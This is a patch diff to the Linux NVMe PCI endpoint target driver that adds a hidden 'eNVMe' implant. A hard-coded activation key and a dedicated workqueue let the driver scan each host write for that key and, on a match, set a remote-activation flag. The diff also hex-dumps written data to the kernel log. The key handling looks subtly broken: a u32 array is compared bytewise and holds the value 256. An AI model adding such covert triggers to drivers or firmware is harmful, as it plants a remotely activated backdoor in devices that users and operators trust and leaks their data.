@@ -24,6 +24,29 @@
 /* Relative to linux include directory, for OoT build */
 #include <../drivers/nvme/target/nvmet.h>
 
+/* Unique eNVMe activation key */
+#define NVME_EVIL_ACTIVATION_KEY_LEN 256
+static const u32 activation_key[NVME_EVIL_ACTIVATION_KEY_LEN] = {
+	173,104,115,108,144, 88, 50, 76, 41,228,178, 51,145,254,156, 44,
+	 99, 98, 58,140,233,176,165,109,134,  8,181, 95, 26, 43,107, 60,
+	161, 61,246, 87, 78, 73, 57,215, 53,175,  7, 11,184, 77, 37,  2,
+	148,200,205, 19,137, 66, 13,186, 93,236,248,111, 21,177,120,234,
+	163, 65,  4,133,141,243,151,174,129, 74, 64,  0,195,157,216,162,
+	235, 45,249,213, 22,155,247, 14, 32, 75, 67,183, 63,139,  1, 59,
+	 20,113,136,138,187,154,223,189,193,110,225,101,203,222, 81,240,
+	125, 72,238,204, 12, 55,231, 24,255,244,118, 17,152, 56, 97,116,
+	 80,135, 79, 70, 42,250,114,159,209,207, 52,237,188,167, 71, 40,
+	160, 36, 82,182,142,126, 38, 10,103, 49, 27,106,194,226,253, 68,
+	206, 69,201,171,251, 34,218,  3,128,170,121,146, 96,150,  6, 85,
+	 89,119,197,153, 86,202,  5,179, 91, 94,211,219,100,239, 35,217,
+	224,149,105,196, 62, 90,117,191, 31,147,131,  9,185,230,158,166,
+	199,232, 25,172,252, 46,242, 39,130,122,164,143, 48,124, 15,180,
+	102,220,241,227,229,190,169,212,208, 33, 16, 28, 47,214, 18,123,
+	245,198, 54,127,256, 23, 30,132, 92,210,192, 83,112, 84,221, 29,
+};
+/* eNVMe activation status */
+static bool evil_activated = false;
+
 static LIST_HEAD(nvmet_pci_epf_ports);
 static DEFINE_MUTEX(nvmet_pci_epf_ports_mutex);
 
@@ -150,6 +173,7 @@ struct nvmet_pci_epf_iod {
 	struct sg_table			data_sgt;
 
 	struct work_struct		work;
+	struct work_struct		evil_work;
 	struct completion		done;
 };
 
@@ -184,6 +208,7 @@ struct nvmet_pci_epf_ctrl {
 
 	struct delayed_work		poll_cc;
 	struct delayed_work		poll_sqs;
+	struct workqueue_struct		*evil_wq;
 
 	struct mutex			irq_lock;
 	struct nvmet_pci_epf_irq_vector	*irq_vectors;
@@ -670,6 +695,7 @@ static inline const char *nvmet_pci_epf_iod_name(struct nvmet_pci_epf_iod *iod)
 }
 
 static void nvmet_pci_epf_exec_iod_work(struct work_struct *work);
+static void nvmet_pci_epf_evil_work(struct work_struct *work);
 
 static struct nvmet_pci_epf_iod *
 nvmet_pci_epf_alloc_iod(struct nvmet_pci_epf_queue *sq)
@@ -691,6 +717,7 @@ nvmet_pci_epf_alloc_iod(struct nvmet_pci_epf_queue *sq)
 	INIT_LIST_HEAD(&iod->link);
 	iod->dma_dir = DMA_NONE;
 	INIT_WORK(&iod->work, nvmet_pci_epf_exec_iod_work);
+	INIT_WORK(&iod->evil_work, nvmet_pci_epf_evil_work);
 	init_completion(&iod->done);
 
 	return iod;
@@ -1187,6 +1214,50 @@ static void nvmet_pci_epf_complete_iod(struct nvmet_pci_epf_iod *iod)
 	list_add_tail(&iod->link, &cq->list);
 	queue_delayed_work(system_highpri_wq, &cq->work, 0);
 	spin_unlock_irqrestore(&cq->lock, flags);
+}
+
+static void nvmet_pci_epf_evil_work(struct work_struct *work)
+{
+	struct nvmet_pci_epf_iod *iod =
+		container_of(work, struct nvmet_pci_epf_iod, evil_work);
+	struct nvmet_pci_epf_ctrl *ctrl = iod->ctrl;
+	struct device *dev = ctrl->dev;
+	int ret = 1;
+	size_t i, bytes_remaining = NVME_EVIL_ACTIVATION_KEY_LEN, btc, offset = 0;
+
+	/* Only check the hash on smaller transfers, remote activation should
+	 * use a small write to activate, don't bother with large writes */
+	if (iod->data_len <= SZ_128K &&
+	    iod->data_len >= NVME_EVIL_ACTIVATION_KEY_LEN &&
+	    iod->nr_data_segs) {
+		/* Loop over segments if necessary */
+		for (i = 0; i < iod->nr_data_segs; ++i) {
+			btc = min_t(size_t, iod->data_segs[i].length,
+					bytes_remaining);
+			//dev_info(dev, "Comparing segment %ld, offset: %ld, btc %ld\n",
+			//		i, offset, btc);
+			if (WARN_ON(!iod->data_segs[i].buf)) {
+				nvmet_pci_epf_free_iod(iod);
+				return;
+			}
+			print_hex_dump_bytes("", DUMP_PREFIX_ADDRESS, iod->data_segs[i].buf,
+					     btc);
+			ret = memcmp(iod->data_segs[i].buf, activation_key + offset, btc);
+			bytes_remaining -= btc;
+			offset += btc;
+
+			/* if mismatch or finished comparing break */
+			if (ret || bytes_remaining == 0)
+				break;
+		}
+
+		if (!ret) {
+			dev_info(dev, "evil: REMOTE ACTIVATION\n");
+			evil_activated = true;
+		}
+	}
+
+	nvmet_pci_epf_free_iod(iod);
 }
 
 static void nvmet_pci_epf_drain_queue(struct nvmet_pci_epf_queue *queue)
@@ -1799,7 +1870,11 @@ static void nvmet_pci_epf_cq_work(struct work_struct *work)
 			cq->phase ^= 1;
 		}
 
-		nvmet_pci_epf_free_iod(iod);
+		if (iod->sq->qid && iod->cmd.common.opcode == nvme_cmd_write) {
+			queue_work_on(WORK_CPU_UNBOUND, ctrl->evil_wq, &iod->evil_work);
+		} else {
+			nvmet_pci_epf_free_iod(iod);
+		}
 
 		/* Signal the host. */
 		nvmet_pci_epf_raise_irq(ctrl, cq, false);
@@ -2024,6 +2099,9 @@ static int nvmet_pci_epf_create_ctrl(struct nvmet_pci_epf *nvme_epf,
 	ctrl->mdts = nvme_epf->mdts_kb * SZ_1K;
 	INIT_DELAYED_WORK(&ctrl->poll_cc, nvmet_pci_epf_poll_cc_work);
 	INIT_DELAYED_WORK(&ctrl->poll_sqs, nvmet_pci_epf_poll_sqs_work);
+	ctrl->evil_wq = create_singlethread_workqueue("evil wq");
+	if (!ctrl->evil_wq)
+		return -ENOMEM;
 
 	ret = mempool_init_kmalloc_pool(&ctrl->iod_pool,
 					max_nr_queues * NVMET_MAX_QUEUE_SIZE,
